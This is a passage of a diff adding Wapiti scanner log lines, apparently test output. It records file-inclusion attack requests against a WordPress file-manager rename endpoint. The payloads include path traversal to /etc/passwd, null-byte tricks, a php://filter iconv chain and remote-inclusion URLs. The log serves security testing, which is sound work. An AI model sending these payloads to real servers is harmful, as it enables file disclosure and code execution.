+	data: filename=%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:07.694 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&fileid=45
+2024-03-21 15:27:08.490 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&fileid=45
+2024-03-21 15:27:09.306 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&fileid=45
+2024-03-21 15:27:10.103 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:10.922 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:11.723 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&fileid=45
+2024-03-21 15:27:12.533 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&fileid=45
+2024-03-21 15:27:13.349 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&fileid=45
+2024-03-21 15:27:14.152 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&fileid=45
+2024-03-21 15:27:14.947 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&fileid=45
+2024-03-21 15:27:15.746 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&fileid=45
+2024-03-21 15:27:16.549 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&fileid=45
+2024-03-21 15:27:17.348 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:18.151 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:18.949 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:19.738 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:20.537 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:21.330 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:22.129 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:22.947 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:23.772 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&fileid=45
+2024-03-21 15:27:24.579 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&fileid=45
+2024-03-21 15:27:25.384 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&fileid=45
+2024-03-21 15:27:26.185 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&fileid=45
+2024-03-21 15:27:26.983 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&fileid=45
+2024-03-21 15:27:27.786 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:28.588 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:29.389 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:30.190 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:30.995 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:31.796 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:32.643 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:33.474 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:34.282 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&fileid=45
+2024-03-21 15:27:35.088 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&fileid=45
+2024-03-21 15:27:35.892 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&fileid=45
+2024-03-21 15:27:36.712 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&fileid=45
+2024-03-21 15:27:37.532 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:38.329 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:39.134 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:39.937 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:40.743 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:41.551 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:42.344 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:43.146 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:43.943 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=file%3A%2F%2F%2Fetc%2Fpasswd&fileid=45
+2024-03-21 15:27:44.742 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&fileid=45
+2024-03-21 15:27:45.545 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&fileid=45
+2024-03-21 15:27:46.344 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&fileid=45
+2024-03-21 15:27:47.151 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:47.951 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:48.760 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:49.551 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&fileid=45
+2024-03-21 15:27:50.351 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=index.php&fileid=45
+2024-03-21 15:27:51.155 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=index.php%00&fileid=45
+2024-03-21 15:27:51.992 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=index.php%3A%3A%24DATA&fileid=45
+2024-03-21 15:27:52.799 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-21 15:27:53.592 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-21 15:27:54.393 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%2Fetc%2Fpasswd
+2024-03-21 15:27:55.190 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%2Fetc%2Fpasswd%00
+2024-03-21 15:27:55.978 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%2Fetc%2Fservices
+2024-03-21 15:27:56.790 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=%2Fetc%2Fservices%00
+2024-03-21 15:27:57.572 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-21 15:27:58.367 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-21 15:27:59.150 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-21 15:27:59.941 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 15:28:00.731 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 15:28:01.515 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
